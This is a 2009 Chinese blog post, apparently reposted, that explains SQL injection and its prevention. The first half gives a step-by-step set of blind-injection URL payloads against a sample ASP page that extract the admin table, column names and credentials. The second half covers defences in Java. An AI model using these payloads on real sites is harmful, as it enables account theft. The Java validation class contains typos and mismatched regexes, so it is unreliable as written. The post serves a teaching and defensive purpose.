<html><head><title><div class="tit">
  web安全，SQL注入过程与防范
</div></title></head><body><div id='tit'>web安全，SQL注入过程与防范</div><div id='cate'>细节</div><div id='date'>2009年03月23日 星期一 11:51 P.M.</div><div id='page'>60</div><a id='url' href='http://hi.baidu.com/hxzon/blog/item/ecd5982f1f7b11301e308942.html'>http://hi.baidu.com/hxzon/blog/item/ecd5982f1f7b11301e308942.html</a><div id='cnt'><h3 class="type_original" title="原创"><a href="http://leves.javaeye.com/blog/353842">web安全，SQL注入过程与防范</a></h3> 
<div class="blog_content"> 
 <p>举例一个来自网上的典型sql注入的<span style="color: rgb(255,0,0)">过程分析</span>：&nbsp;&nbsp;&nbsp;&nbsp; <br /> <br /> 如： 打开：http://hostlocal/test2/list.asp?id=17在其后面加＇为http://hostlocal/test2/list.asp?id=17＇ <br /> 出错！显示为：“数据库出错”。那么接下来我们便进行如下操作： <br /> <br /> 1 猜管理员帐号表。 <br /> 2 猜相应表中的用户的字段名以及密码的字段名。 <br /> 3 猜出用户名的长度和密码的长度 <br /> 4 猜出用户和密码 <br /> 5 找到管理页面进入管理 <br /> <br /> 猜管理员的表：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br /> <br /> http://hostlocal/test2/list.asp?id=17 and 1=(select min(id) from admin)＇//min(id)返回表中ID最小值 <br /> <br /> 返回文章证明，有一个admin的表；如果没有返回文章，证明出错不存在admin这个表。 <br /> &nbsp;&nbsp;&nbsp;&nbsp; <br /> 猜用户的字段名： <br /> <br /> http://hostlocal/test2/list.asp?id=17 and 1=(select min(id) from admin where user=＇aaa＇)返回错误信息，表示没有user这个用户段名 <br /> 再来！~~~http://hostlocal/test2/list.asp?id=17 and 1=(select min(id) from admin where username=＇aaa＇) <br /> 没有返回错误信息，又没有返回文章，提示找不到文章。证明在admin中存在username个字段，只是用户名不是aaa <br /> <br /> 猜密码的字段名： <br /> <br /> http://hostlocal/test2/list.asp?id=17 and 1=(select min(id) from admin where passwd=＇aaa＇)返回错误信息表示没有passwd这个密码字段名。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br /> <br /> 再来：http://hostlocal/test2/list.asp?id=17 and 1=(select min(id) from admin where password=aaa＇)没有返回错误信息，又没有返回文章，提示找不到文章。证明在admin中存在password这个字段，只是密码不是aaa <br /> <br /> 猜用户字段名长度：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br /> <br /> http://hostlocal/test2/list.asp?id=17 and 1=(select min(id) from admin where len(username) <br /> <br /> &gt;5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br /> <br /> 正确 <br /> http://hostlocal/test2/list.asp?id=17 and 1=(select min(id) from admin where len(username)&lt;10) <br /> <br /> 正确 <br /> 用户名长度大于5小于10 <br /> http://hostlocal/test2/list.asp?id=17 and 1=(select min(id) from admin where len(username) <br /> <br /> =7)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br /> <br /> 呵``` 用户名长度为7位 <br /> <br /> 猜密码长度： <br /> <br /> http://hostlocal/test2/list.asp?id=17 and 1=(select min(id) from admin where len(password)&gt;5) <br /> 正确 <br /> http://hostlocal/test2/list.asp?id=17 and 1=(select min(id) from admin where len(password)&lt;10) <br /> 正确 <br /> 密码长度也是大于5小于10 <br /> http://hostlocal/test2/list.asp?id=17 and 1=(select min(id) from admin where len(password)=7) <br /> 呵``` 密码长度为7位 <br /> <br /> 猜用户名： <br /> <br /> http://hostlocal/test2/list.asp?id=17 and 1=(select min(id) from admin where mid(username,1,1)=＇a＇) <br /> <br /> 用户名第一个字母是：a&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br /> <br /> 猜用户名第二位:http://hostlocal/test2/list.asp?id=17 and 1=(select min(id) from admin where mid(username,2,1)=＇b＇)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br /> <br /> 以此类推！ <br /> <br /> 猜密码：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br /> <br /> 猜密码跟猜用户名一样！ <br /> <br /> http://hostlocal/test2/list.asp?id=17 and 1=(select min(id) from admin where mid(password,1,1)=＇a＇) <br /> 猜完后来到管理页面： <br /> http://hostlocal/test2/admin.asp <br /> <br /> 登录 <br /> <br /> <br /> 接来来讲述如何防范基于java web开发平台的sql注入防范 <br /> <br /> <strong><span style="font-size: medium; color: rgb(0,255,0)">一、编写数据验证类</span> </strong><br /> <br /> parameterCheck.java&nbsp;&nbsp; <br /> &nbsp;&nbsp;&nbsp; <br /> public class parameterCheck{ <br /> &nbsp;&nbsp;&nbsp;&nbsp; String emailregex=&quot;[’\\w_-]+(\\. [’\\w_-]+)*@[’\\w_-]+(\\.[’\\w_-]+)*\\.[a-zA-Z]{2，4}&quot;; <br /> &nbsp;&nbsp;&nbsp;&nbsp; String intregex=&quot;^(\\d{5}-\\d{4})| (\\d{5})$&quot;; <br /> &nbsp;&nbsp;&nbsp;&nbsp; Stirng zipregex=&quot;^-[0-9]+$|^[0-9] +$&quot;; <br /> <br /> &nbsp;&nbsp;&nbsp; public static Boolean isEmail(string emailString){ <br /> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return java.util.regex.Pattern.compile(emailregex).matcher(emailString).matches(); <br /> <br /> &nbsp;&nbsp;&nbsp; } <br /> &nbsp;&nbsp;&nbsp; public static boolean isInt(string intString){ <br /> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return java.util.regex.Pattern.compile(intregex).matcher(intString).matches(); <br /> &nbsp;&nbsp;&nbsp; } <br /> &nbsp;&nbsp;&nbsp; public static boolean isZip(string zipString){ <br /> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return java.util.regex.Pattern.compile(zipregex).matcher(zipString).matches();&nbsp;&nbsp;&nbsp; } <br /> } <br /> <br /> <strong><span style="color: rgb(255,0,0)">注：</span></strong> <br /> 三种regex 匹配方法 其中public boolean matches(String regex) 此方法调用的 str.matches(regex) 形式与第二种表达式产生完全相同的结果 <br /> 如果要多次使用一种模式，第三种方法编译一次后重用此模式比每次都调用此方法效率更高。 <br /> 1.public Boolean java.lang.String.matchs(String regex); <br /> <br /> 2.public Boolean java.util.regex.Pattern.matches(regex, input); <br /> <br /> 3.public Boolean java.util.regex.Pattern.compile(regex).matcher(input).matches() <br /> <br /> <br /> <strong><span style="font-size: medium; color: rgb(0,255,0)">二、始终使用预编译preparedStatement 代替 statement</span> <br /> </strong>PreparedStatement pstmt = con.prepareStatement(&quot;UPDATE EMPLOYEES <br /> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SET SALARY = ? WHERE ID = ?&quot;); <br /> &nbsp;&nbsp; pstmt.setBigDecimal(1, 153833.00) <br /> &nbsp;&nbsp; pstmt.setInt(2, 110592) <br /> <br /> 预编译首先从名字上就知道提高了程序的执行性能，同时在代码上提高了可读性，最重要的是 <br /> 在安全性上 <br /> <br /> <strong><span style="font-size: medium"><span style="color: rgb(0,255,0)">三、 使用存储过程</span> <br /> </span></strong>存储过程是数据库端的，经过预编译的过程，在安全性上主要对是一些使用运算符（如 AND 或 OR）将命令附加到有效输入参数值的攻击。在应用程序受到攻击时，存储过程还可以隐藏业务规则的实现。 <br /> <br /> <br /> JDBC API 提供了一个存储过程 SQL 转义语法，该语法允许对所有 RDBMS 使用标准方式调用存储过程。 <br /> public interface CallableStatement extends PreparedStatement <br /> <br /> 无返回结果的过程语法： <br /> &nbsp;&nbsp;&nbsp; {call 过程名[(?, ?, ...)]} <br /> <br /> 返回结果参数的过程的语法为： <br /> <br /> {? = call 过程名[(?, ?, ...)]} <br /> <br /> 不带参数的已储存过程的语法类似： <br /> <br /> {call 过程名}</p> 
 <p><a href="http://leves.javaeye.com/blog/353842">http://leves.javaeye.com/blog/353842</a></p> 
</div></div></body></html>